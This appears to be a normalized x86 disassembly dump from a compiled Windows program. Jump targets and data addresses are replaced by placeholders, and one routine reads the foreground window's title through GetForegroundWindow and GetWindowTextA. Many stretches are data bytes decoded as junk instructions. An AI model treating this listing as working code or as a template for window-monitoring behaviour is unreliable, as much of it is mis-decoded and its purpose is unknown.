mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
sub [ ebp - 0x8 ] 0x3
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_40899c
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0180
pop ecx
sub_416c3a
jmp r-xdata
test esi esi
jne r-xdata
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa5 ] 0x0
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
inc [ ebp - 0x8 ]
mov eax rw-data
mov [ edi ] eax
mov edx rw-data
inc [ ebp - 0x8 ]
mov [ edi ] edx
mov edx [ ebp - 0x24 ]
mov eax edi
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0x2c ]
mov eax [ ecx + 0x24 ]
cmp eax 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x10
mov edx [ ebp - 0x2c ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xac ] edx
mov edx [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ edx ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb4 ] ecx
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb8 ] edx
mov eax [ ebp - 0xb0 ]
push eax
mov ecx [ ebp - 0xb4 ]
push ecx
mov eax [ ebp - 0xb8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xbd ] 0x0
mov ecx [ ebx + 0x24 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0xbc ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0xc4 ]
mov cl [ ebp - 0xbd ]
mov [ eax ] cl
sub_416e08
push ebp
mov ebp esp
add esp 0xffffffc8
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x2c ]
push edx
push 0x18
call sub_415614
add esp 0x8
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] 0x30
mov bl [ ebp + 0x1c ]
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x38 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x30 ]
mov [ ecx + 0x8 ] eax
mov edi [ ebp - 0x4 ]
add edi 0xc
mov edx esi
mov eax edi
call sub_4d3050
inc [ ebp - 0xc ]
mov ecx [ esi + 0x4 ]
mov [ edi + 0x4 ] ecx
inc [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] bl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x15 ] 0x0
add [ ebp - 0xc ] 0xfffffffe
mov [ ebp - 0x18 ] 0x18
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f29
aam 0xb8
and ah bl
dec ebp
add [ ebx + 0x56 ] dl
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push ebx
call sub_4b0180
pop ecx
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
sub_41709b
inc [ ecx ]
add [ eax ] al
add [ eax ] cl
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
popad
insb
outsd
add [ bx + si ] al
insb
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
cmp al 0x54
dec ecx
outsb
jo r-xdata
in al dx
je r-xdata
add [ eax ] al
sub al 0x1d
inc eax
inc esp
imul esp [ ecx + 0x6c ] 0x676f
popad
insd
inc esp
imul esp [ ecx + 0x6c ] 0x3e676f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] al
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
inc esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
add [ eax ] al
add [ edx ] dl
add [ eax ] al
add [ ecx + esi * 2 ] bh
inc ecx
add [ ebx ] al
add [ eax ] bl
push esp
dec ecx
outsb
jo r-xdata
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
inc esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x5000000 ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x30042 ] cl
pop eax
add [ ebx + 0x6c ] al
popad
jae r-xdata
je r-xdata
push 0x746e4969
jb r-xdata
jae r-xdata
lodsd [ esi ]
popad
insd
pop ebp
retn
popad
arpl [ ebp + 0x3c ] sp
inc ebx
insb
popad
jae r-xdata
xor [ eax ] al
cmp dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jae r-xdata
jo r-xdata
outsb
jae r-xdata
test esi 0x1
je r-xdata
cmp cl [ ecx + 0x53 ]
je r-xdata
add [ edx + 0x2 ] esi
imul ecx [ ecx + 0x6e ] 0x66726574
add [ eax ] al
js r-xdata
pop esi
pop ebx
retn
push ebx
call sub_4b0180
pop ecx
push ebp
clc
jle r-xdata
imul ebp [ esi + 0x67 ] 0x61644173
jo r-xdata
add [ eax ] al
add al 0x0
add [ eax ] al
add eax [ eax ]
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb [ eax ] al
or [ eax ] al
add [ eax ] al
mov esi ecx
call sub_4d369c
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov eax [ ebp - 0x4 ]
add eax 0x394
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x398
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
jb r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub [ rw-data ] 0x1
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop ebp
retn
mov eax [ ebx ]
test eax eax
je r-xdata
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
xor ecx ecx
mov [ ebx ] ecx
sub_4172ac
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov eax [ ebp - 0x4 ]
add eax 0x394
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x398
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_417324
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
add [ ebp + 0x41 ] dh
add [ ecx + eax * 2 + 0x70 ] dl
jo r-xdata
hlt
popad
jo r-xdata
add eax [ eax ]
add [ ebp + 0x148d9214 ] cl
xchg edx eax
jne r-xdata
lea edx [ edx + edx * 4 ]
call sub_4856e4
mov dl 0x1
mov eax [ ebx + 0x38c ]
call sub_4856d4
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481adc
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
add [ ebx ] dh
ror [ ebx + 0x38c80 ] cl
add al ch
and ebx 0x6
add bl al
nop
nop
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0x18
xor edx edx
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ ebx + 0x37c ]
call sub_48df68
lea eax [ ebp - 0x4 ]
call sub_4d3514
mov esi eax
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov edx esi
mov [ ebp - 0x18 ] 0xc
shl edx 0x3
mov eax [ ebx + 0x38c ]
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
sub_4173e8
push ebp
mov ebp esp
add esp 0xfffff7d4
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
xor edx edx
mov eax [ ebx + 0x38c ]
call sub_4856d4
call GetForegroundWindow
mov esi eax
lea eax [ ebp - 0x42c ]
push 0x400
push eax
push esi
call GetWindowTextA
push 0x400
lea edx [ ebp - 0x82c ]
push edx
push esi
call sub_41cdd0
add esp 0xc
lea ecx [ ebp - 0x82c ]
push ecx
lea eax [ ebp - 0x42c ]
push eax
push esi
push rw-data
push rw-data
call sub_41c354
mov [ ebx + 0x390 ] 0x1
mov [ ebp - 0x1c ] 0xc
add esp 0x14
lea edx [ ebp - 0x42c ]
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x394 ]
call sub_4d31b4
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x1c ] 0x18
lea edx [ ebp - 0x82c ]
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
lea eax [ ebx + 0x398 ]
call sub_4d31b4
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
call sub_43a8fc
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481be0
mov [ ebx + 0x2a4 ] 0x1
mov eax ebx
call sub_47dde4
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417500
mov al [ 0x3000003 ]
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x44000000 ] dh
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dl
add [ eax ] al
adc al 0x0
add [ eax ] al
mov al [ 0x3004175 ]
add [ eax ] bl
push esp
inc ecx
jo r-xdata
inc ebx
popad
jo r-xdata
add [ ebx - 0x470f7426 ] cl
js r-xdata
jne r-xdata
jo r-xdata
dec ebp
add al ch
rcr ebx 0xa
inc esp
imul esp [ ecx + 0x6c ] 0x676f
add [ ebx + 0x40 ] ch
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sbb [ eax ] al
xchg esp eax
add eax [ eax ]
add ah bh
sbb [ eax ] al
cwde
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] dh
inc ecx
add [ edi ] al
adc [ ecx + eax * 2 + 0x70 ] edx
jo r-xdata
mov esp ebp
pop ebp
retn
jne r-xdata
pop esi
pop ebx
mov eax esi
call sub_4d36a4
add [ ebx + ebx * 8 + 0x4dff337c ] al
clc
popad
jo r-xdata
inc esp
insb
add [ bx + si ] al
nop
nop
nop
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
test bl bl
jle r-xdata
dec esi
test eax 0x4d8bfffe
fsub [ ecx + ecx * 4 + 0xd ]
add [ eax ] al
add [ eax ] al
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
lea eax [ esi + 0x398 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x8 ]
lea eax [ esi + 0x394 ]
mov edx 0x2
call sub_4d318c
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
dec [ ebp - 0x8 ]
inc esp
imul esp [ ecx + 0x6c ] 0xddb0676f
dec ebp
add [ edi + edx * 2 + 0x47 ] dl
add [ eax + eax + 0xd ] ch
inc ecx
jo r-xdata
inc ebx
popad
sub_417630
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_417688
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x2c ] eax
mov eax rw-data
call sub_4c517c
mov edx [ ebp - 0x2c ]
mov ecx [ edx + 0x378 ]
xor edx edx
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov edx 0x96
call sub_4a71a8
mov eax [ ebp - 0x2c ]
mov edx 0x1
mov ecx [ eax + 0x378 ]
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov edx 0xc8
call sub_4a71a8
mov eax [ ebp - 0x2c ]
mov edx 0x2
mov ecx [ eax + 0x378 ]
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov edx 0xfa
call sub_4a71a8
xor ebx ebx
jmp r-xdata
mov ecx [ rw-data ]
add ecx 0x8
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x14 ]
mov edx [ ecx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x378 ]
mov eax [ edx + 0x28c ]
call sub_4a8150
mov esi eax
mov eax [ rw-data ]
lea edi [ ebx + ebx * 2 ]
mov edx [ eax + 0x18 ]
mov eax esi
mov edx [ edx + edi * 4 ]
call sub_4a7bcc
mov edx [ rw-data ]
lea eax [ esi + 0x8 ]
mov ecx [ edx + 0x18 ]
mov eax [ eax ]
mov edx [ ecx + edi * 4 + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ rw-data ]
lea eax [ esi + 0x8 ]
mov ecx [ edx + 0x18 ]
mov eax [ eax ]
mov edx [ ecx + edi * 4 + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
mov eax [ rw-data ]
mov ecx [ eax ]
sub ecx 0x1
jb r-xdata
cmp edx ebx
ja r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x398 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x3a0 ]
add eax 0x29c
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x2c ]
mov edx rw-data
mov ebx [ eax + 0x3a0 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] 0xc
add ebx 0x29c
call sub_4d3010
inc [ ebp - 0xc ]
mov ecx [ eax ]
mov eax [ ebx ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x60 ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x2c ]
mov ebx [ ecx + 0x3a0 ]
add ebx 0x29c
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x394 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xe0 ]
dec ecx
je r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x3a0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x3a0 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x39c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417898
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi eax
mov eax rw-data
call sub_4c517c
mov eax [ esi + 0x378 ]
call sub_4ac538
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x54 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x44 ] 0xc
mov ecx esi
mov dl 0x1
mov eax [ rw-data ]
call sub_419d94
mov esi eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] esi
lea edx [ ebx + 0x20 ]
inc [ ebp - 0x38 ]
mov [ ebp - 0x44 ] 0x18
mov [ ebp - 0x44 ] 0x24
call sub_4d3050
inc [ ebp - 0x38 ]
mov edx [ eax ]
mov eax [ esi + 0x378 ]
call sub_48dfa0
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x44 ] 0x30
lea esi [ ebx + 0x8 ]
xor eax eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x18 ] eax
inc [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x58 ]
mov eax [ edx ]
mov edx 0x1
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x37c ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x44 ] 0x3c
mov [ ebp - 0x5c ] esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x5c ]
mov eax [ eax ]
xor edx edx
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x380 ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov [ ebp - 0x44 ] 0x18
dec eax
jne r-xdata
dec [ ebp - 0x38 ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x44 ] 0x48
xor ecx ecx
mov [ ebp - 0x20 ] ecx
lea edx [ ebp - 0x20 ]
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x378 ]
call sub_48df68
lea edx [ ebp - 0x20 ]
mov eax ebx
mov edx [ edx ]
call sub_4a7bcc
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x44 ] 0x54
xor eax eax
mov edi esi
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x38 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x37c ]
call sub_48df68
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
mov edx 0x1
mov edi [ eax ]
mov ecx [ ecx ]
call [ edi + 0x20 ]
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x44 ] 0x60
xor ecx ecx
mov ebx esi
mov [ ebp - 0x28 ] ecx
lea edx [ ebp - 0x28 ]
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x380 ]
call sub_48df68
mov eax [ ebx ]
lea ecx [ ebp - 0x28 ]
xor edx edx
mov ebx [ eax ]
mov ecx [ ecx ]
call [ ebx + 0x20 ]
dec [ ebp - 0x38 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x44 ] 0x18
mov [ ebp - 0x44 ] 0x0
mov ebx esi
mov edi ebx
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
mov eax [ ebp - 0x30 ]
mov edx [ eax ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x44 ] 0x84
mov edx 0x3
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x44 ] 0x6c
sub_417ad3
inc [ edi ]
add [ eax ] al
add [ eax + 0x9000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x65 ] ah
inc ecx
add [ ecx ] al
add [ eax + eax + 0x3a647473 ] dl
cmp dh [ ebp + 0x6e ]
imul esi [ ecx + 0x75 ] 0x74705f65
jb r-xdata
add [ eax ] al
push esp
inc ecx
jo r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
inc esp
imul esp [ ecx + 0x6c ] 0x732c676f
je r-xdata
dec [ ebp - 0x2c ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebx + 0x378 ]
mov eax [ ecx + 0x28c ]
call sub_4a8150
mov [ ebp - 0x38 ] 0x24
xor edx edx
mov ebx eax
mov [ ebp - 0x14 ] edx
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x378 ]
call sub_48df68
lea edx [ ebp - 0x14 ]
mov eax ebx
mov edx [ edx ]
call sub_4a7bcc
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x38 ] 0x30
xor eax eax
lea esi [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
mov edi esi
inc [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x380 ]
call sub_48df68
mov eax [ edi ]
lea edx [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ edx ]
call [ ecx + 0x38 ]
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x38 ] 0x3c
xor ecx ecx
mov ebx esi
mov [ ebp - 0x1c ] ecx
lea edx [ ebp - 0x1c ]
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x37c ]
call sub_48df68
mov eax [ ebx ]
lea edx [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ edx ]
call [ ecx + 0x38 ]
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
pop ebx
xor bl [ ebp ]
push ebp
mov ebp esp
and [ edx ] ch
cmp bh [ edx ]
popa
jne r-xdata
mov [ ebp - 0x38 ] 0x18
mov eax [ ebp - 0x48 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
mov edi ebx
mov [ ebp - 0x24 ] edi
test edi edi
je r-xdata
call sub_4c517c
mov [ ebp - 0x38 ] 0xc
fdivr [ eax + rw-data ]
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x38 ] 0x60
mov edx 0x3
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x38 ] 0x48
add esp 0xffffffb8
push ebx
push esi
push edi
mov ebx eax
add [ ebp - 0x75 ] dl
in al dx
insb
je r-xdata
mov eax rw-data
cmp al 0x54
inc ecx
jo r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call sub_419d94
mov edx eax
mov [ ebp - 0x8 ] edx
mov eax edx
inc [ ebp - 0x2c ]
mov [ ebp - 0x38 ] 0x18
mov edx [ eax ]
call [ edx + 0x100 ]
dec eax
jne r-xdata
add [ eax ] al
int3
dec esp
imul ebp [ esi + 0x6b ] 0x6d657449
inc esp
imul esp [ ecx + 0x6c ] 0x203e676f
add [ eax ] al
sub_417ce8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x378 ]
call sub_4ac538
test eax eax
jne r-xdata
push 0x4
mov [ ebp - 0x20 ] 0xc
mov eax [ ebx + 0x378 ]
call sub_4ac538
mov edx eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
add edx 0x20
inc [ ebp - 0x14 ]
lea ecx [ ebp - 0x4 ]
mov eax rw-data
call sub_4d3564
lea edx [ ebp - 0x4 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
pop eax
call sub_4d31c8
mov edx [ ebp - 0xc ]
test edx edx
je r-xdata
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
mov eax edx
jmp r-xdata
mov edx rw-data
mov edx [ ebp - 0xc ]
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x378 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x30 ]
mov [ fs : 0x0 ] eax
jmp r-xdata
